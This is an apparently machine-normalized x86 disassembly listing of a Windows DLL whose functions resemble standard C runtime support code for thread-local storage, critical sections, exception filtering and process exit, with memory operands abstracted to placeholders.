pop ecx
push eax
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_1000449e
push 0xc
call sub_100071d3
pop ecx
retn
sub_1000452a
push esi
call sub_100044a7
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_10007f04
pop ecx
sub_1000464e
push 0xd
call sub_100071d3
pop ecx
retn
sub_1000465a
push 0xc
call sub_100071d3
pop ecx
retn
sub_10004850
mov eax [ esp + 0x4 ]
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
sub eax [ esp + 0x4 ]
sar eax 0x1
dec eax
retn
sub_10004866
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_100049f1
push esi
call sub_100049de
mov ecx [ esp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_10004990
pop ecx
mov esi eax
call sub_100049cb
mov [ eax ] esi
pop esi
retn
sub_10004c01
mov eax sub_1000ac45
mov [ rw-data ] eax
mov [ rw-data ] sub_1000a341
mov [ rw-data ] sub_1000a2ff
mov [ rw-data ] sub_1000a333
mov [ rw-data ] sub_1000a2a9
mov [ rw-data ] eax
mov [ rw-data ] sub_1000abbf
mov [ rw-data ] sub_1000a2bf
mov [ rw-data ] sub_1000a229
mov [ rw-data ] sub_1000a1b8
retn
sub_10004c61
call sub_10004c01
call sub_1000acea
cmp [ esp + 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
retn
call sub_1000ac85
sub_100054e9
push 0xe
call sub_100071d3
pop ecx
retn
j_sub_100063a9
jmp sub_100063a9
sub_1000563f
call sub_10006114
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_100063a9
pop ecx
retn
call sub_1000aedf
sub_10005ac2
push 0x1
call sub_100071d3
pop ecx
retn
sub_10005b11
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10005d9e
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10005cc8
add esp 0xc
pop ebp
retn 0x4
sub_10005e04
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10005cc8
add esp 0xc
pop ebp
retn 0x8
sub_10005f5f
push [ ebp + 0x8 ]
call sub_1000bf66
pop ecx
retn
sub_100060dc
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100056e0
pop ecx
pop ecx
retn
sub_1000610b
push 0x1
call sub_100071d3
pop ecx
retn
sub_10006114
push 0x1
call sub_1000603a
pop ecx
retn
sub_10006346
xor eax eax
inc eax
retn
sub_100063ff
push 0x4
call sub_100071d3
pop ecx
retn
sub_1000658e
push [ ebp + 0x8 ]
call sub_1000bf66
pop ecx
retn
sub_10006dbc
push [ ebp + 0x8 ]
call sub_1000bf66
pop ecx
retn
sub_100071d3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100072a2
push 0xa
call sub_100071d3
pop ecx
retn
sub_10007f04
call sub_1000838c
push [ esp + 0x4 ]
call sub_100081ec
push [ rw-data ]
call sub_10004320
push 0xff
call eax
add esp 0xc
retn
sub_10007f28
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_10007f4e
push [ esp + 0x4 ]
call sub_10007f28
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_10007f63
push 0x8
call sub_100072ab
pop ecx
retn
sub_10007f6c
push 0x8
call sub_100071d3
pop ecx
retn
sub_1000816b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_100071d3
pop ecx
sub_10008180
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_100080b2
add esp 0xc
retn
sub_10008191
push 0x1
push 0x0
push 0x0
call sub_100080b2
add esp 0xc
retn
sub_100083c5
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_100089e4
retn
sub_10008b54
mov eax 0xe06d7363
cmp [ esp + 0x4 ] eax
jne r-xdata
xor eax eax
retn
push [ esp + 0x8 ]
push eax
call sub_100089e5
pop ecx
pop ecx
retn
sub_10008c03
and [ rw-data ] 0x0
retn
sub_1000a1aa
push 0x0
push [ esp + 0x8 ]
call sub_1000a174
pop ecx
pop ecx
retn
sub_1000a2a9
fldz
mov eax [ esp + 0x4 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_1000a2ff
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000a2bf
add esp 0x10
retn
sub_1000a333
push 0x0
push [ esp + 0x8 ]
call sub_1000a1b8
pop ecx
pop ecx
retn
sub_1000a341
push 0x0
push [ esp + 0x8 ]
call sub_1000a229
pop ecx
pop ecx
retn
sub_1000a58a
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a4bc
add esp 0x18
pop ebp
retn
sub_1000af75
push 0x1
call sub_100071d3
pop ecx
retn
sub_1000b688
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000b5bc
add esp 0x18
pop ebp
retn
sub_1000b8c0
push 0x0
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000b6a6
add esp 0xc
retn
sub_1000ba3c
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000b8d3
add esp 0x10
retn
sub_1000ba53
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_1000ba5d
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_1000baf3
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_1000bb0a
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_10005b11
retn
push 0x8
call [ SetLastError@IAT ]
sub_1000bbf8
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_1000bd09
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000bc40
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000bd54
call eax
retn
sub_1000bf5d
push 0xa
call sub_100071d3
pop ecx
retn
sub_1000bf66
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_1000c05b
push 0xa
call sub_100071d3
pop ecx
retn
sub_1000c11e
push 0xb
call sub_100071d3
pop ecx
retn
sub_1000c1fe
push [ ebp + 0x8 ]
call sub_1000bf66
pop ecx
retn
sub_1000c39a
push [ ebp + 0x8 ]
call sub_1000bf66
pop ecx
retn
sub_1000c61b
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000c508
add esp 0x10
retn
sub_1000c79c
and [ rw-data ] 0x0
call sub_1000e876
mov [ rw-data ] eax
xor eax eax
retn
sub_1000cc27
call sub_10007f6c
retn
sub_1000cc2d
push [ esp + 0x4 ]
call sub_1000cbf1
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_1000cc3f
push 0x8
push r--data
call sub_10005acc
call sub_1000452a
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1000e986
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1000cc5f
xor eax eax
inc eax
retn
sub_1000cc78
push sub_1000cc3f
call sub_100042b4
pop ecx
mov [ rw-data ] eax
retn
sub_1000cc89
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_1000ccd6
push [ rw-data ]
call sub_10004320
pop ecx
retn
sub_1000ce57
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_100071d3
pop ecx
sub_1000ce93
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_1000ce9d
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_1000d187
push 0x4
call sub_100071d3
pop ecx
retn
sub_1000d2ed
push 0x4
call sub_100071d3
pop ecx
retn
sub_1000d6b0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000ea80
sub_1000d6c6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000ea80
sub_1000d7e4
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_1000ecd6
add esp 0xc
retn
sub_1000de3f
push 0x2
call sub_10007f04
pop ecx
retn
sub_1000e7da
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1000e826
push 0xc
push r--data
call sub_10005acc
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10005b11
retn
sub_1000e843
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1000e8d6
call sub_1000e876
mov [ rw-data ] eax
xor eax eax
retn
sub_1000e97d
push 0x4
call sub_100071d3
pop ecx
retn
sub_1000fa87
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1000fb88
push sub_1000fb1c
call [ SetUnhandledExceptionFilter@IAT ]
push eax
call sub_100042b4
mov [ rw-data ] eax
pop ecx
mov [ rw-data ] 0x1
xor eax eax
retn
sub_1000fba9
cmp [ rw-data ] 0x0
je r-xdata
retn
push [ rw-data ]
call sub_10004320
pop ecx
push eax
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] 0x0
sub_1000fbcd
xor eax eax
inc eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
retn
xor eax eax
